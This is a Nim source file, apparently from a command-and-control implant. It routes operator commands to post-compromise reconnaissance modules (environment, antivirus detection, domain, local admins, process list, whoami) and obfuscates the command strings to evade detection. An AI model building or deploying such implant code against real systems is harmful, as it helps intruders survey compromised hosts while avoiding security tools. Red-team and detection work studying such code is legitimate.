#[
    Adapter: SystemCommandAdapter
    Wraps system modules (env, getAv, getDom, get_local_adm, ps, whoami)
    Implements CommandModulePort to normalize interfaces
    Applies Dependency Inversion Principle
]#

import options
import ../../../domain/models/network_command_context
import ../../modules/system/[env, getAv, getDom, get_local_adm, ps, whoami]
from ../string_obfuscation_adapter import obf

type
    SystemCommandAdapter* = object
        ## Adapter for system command modules
        discard

proc newSystemCommandAdapter*(): SystemCommandAdapter =
    ## Create a new SystemCommandAdapter instance
    result = SystemCommandAdapter()

proc executeCommand*(adapter: SystemCommandAdapter, cmd: string, args: seq[string], cmdGuid: string, ctx: Option[NetworkCommandContext]): string =
    ## Execute a system command
    ## Normalizes different module interfaces to a single interface
    case cmd:
    of obf("env"):
        result = env()
    of obf("getav"):
        result = getAv()
    of obf("getdom"):
        result = getDom()
    of obf("getlocaladm"):
        result = getLocalAdm()
    of obf("ps"):
        result = ps()
    of obf("whoami"):
        result = whoami()
    else:
        result = obf("ERROR: Unknown system command: ") & cmd

